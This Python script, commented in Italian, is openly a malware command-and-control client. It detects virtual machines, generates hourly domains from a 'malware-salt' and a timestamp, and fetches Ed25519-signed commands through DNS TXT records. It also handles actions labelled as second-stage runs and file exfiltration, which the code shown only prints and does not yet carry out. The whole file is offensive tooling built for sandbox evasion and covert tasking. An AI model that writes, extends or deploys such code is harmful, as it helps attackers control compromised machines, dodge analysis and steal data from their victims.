#!/usr/bin/env python3
"""
client_ed25519.py

Client C2 avanzato con supporto a server DNS custom:
  • Rileva se in VM o su host fisico
  • Deriva host dinamico da salt + timestamp UTC
  • Interroga record DNS TXT firmato (_auth.<host>)
  • Verifica firma Ed25519 e validità temporale
  • Attiva comandi e azioni firmate (e.g., RUN_STAGE_2, upload)
  • Permette di specificare indirizzo e porta del resolver DNS
"""
import argparse
import base64
import json
import hashlib
import datetime
import dns.resolver
import nacl.signing
import nacl.exceptions
import platform
from pathlib import Path

# Configurazione di default
KEY_DIR = Path("keys")
PUBKEY_B64 = KEY_DIR.joinpath("ed25519_pub.b64").read_text().strip()
PUBKEY = nacl.signing.VerifyKey(base64.urlsafe_b64decode(PUBKEY_B64))

SALT_PHYS = "malware-salt-phys"
SALT_VM   = "malware-salt-vm"
TLD_MAP = {
    "phys": ["com", "it", "net"],
    "vm":   ["cloud", "dev", "test"]
}

# Utility

def is_vm() -> bool:
    """Rileva ambiente VM tramite DMI e platform flags"""
    try:
        rel = platform.uname().release.lower()
        if "microsoft" in rel:
            return True
        dmi = Path("/sys/class/dmi/id/product_name").read_text(errors="ignore").lower()
        if dmi.startswith(("virtualbox", "kvm", "vmware")):
            return True
    except Exception:
        pass
    return False


def current_salt() -> str:
    return SALT_VM if is_vm() else SALT_PHYS


def gen_label(ts: datetime.datetime) -> str:
    raw = f"{current_salt()}|{ts.isoformat(timespec='seconds')}"
    return hashlib.sha256(raw.encode()).hexdigest()[:12]


def fetch_txt_record(host: str, resolver: dns.resolver.Resolver) -> dict | None:
    """Interroga il record TXT _auth.<host> e decodifica JSON da base64"""
    try:
        qname = f"_auth.{host}"
        answers = resolver.resolve(qname, "TXT", lifetime=3)
        txt = "".join(part.decode() for r in answers for part in r.strings)
        return json.loads(base64.urlsafe_b64decode(txt))
    except Exception:
        return None


def verify_payload(payload: dict) -> bool:
    """Verifica firma Ed25519 e validità temporale"""
    fields = [payload.get(key, "") for key in ("host", "not_before", "valid_until", "command", "action")]
    msg = "|".join(fields).encode()
    try:
        sig = base64.urlsafe_b64decode(payload["sig"])
    except Exception:
        return False
    try:
        PUBKEY.verify(msg, sig)
    except nacl.exceptions.BadSignatureError:
        return False
    now = datetime.datetime.now(datetime.timezone.utc)
    nbf = datetime.datetime.fromisoformat(payload["not_before"]).replace(tzinfo=datetime.timezone.utc)
    vto = datetime.datetime.fromisoformat(payload["valid_until"]).replace(tzinfo=datetime.timezone.utc)
    return nbf <= now <= vto


def main():
    ap = argparse.ArgumentParser(description="C2 Ed25519 Client con DNS custom")
    ap.add_argument("--dns-server", default="127.0.0.1", help="Indirizzo del resolver DNS")
    ap.add_argument("--dns-port", type=int, default=53, help="Porta del resolver DNS")
    args = ap.parse_args()

    # Configura resolver
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [args.dns_server]
    resolver.port = args.dns_port

    # Calcola timestamp all'ora
    now = datetime.datetime.now(datetime.timezone.utc).replace(minute=0, second=0, microsecond=0)
    label = gen_label(now)
    env = "vm" if is_vm() else "phys"
    tlds = TLD_MAP[env]

    for tld in tlds:
        host = f"{label}.{tld}"
        payload = fetch_txt_record(host, resolver)
        if not payload or not verify_payload(payload):
            continue

        print(f"[+] Dominio valido: {host}")
        cmd = payload.get("command", "")
        if cmd:
            print(f"[>] Comando autorizzato: {cmd}")
        action = payload.get("action", "")
        if action.startswith("upload:"):
            path = action.split(":", 1)[1]
            print(f"[>] Esfiltrazione autorizzata: {path}")
        break
    else:
        print("[-] Nessun dominio autorizzato trovato.")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[!] Errore inatteso: {e}")
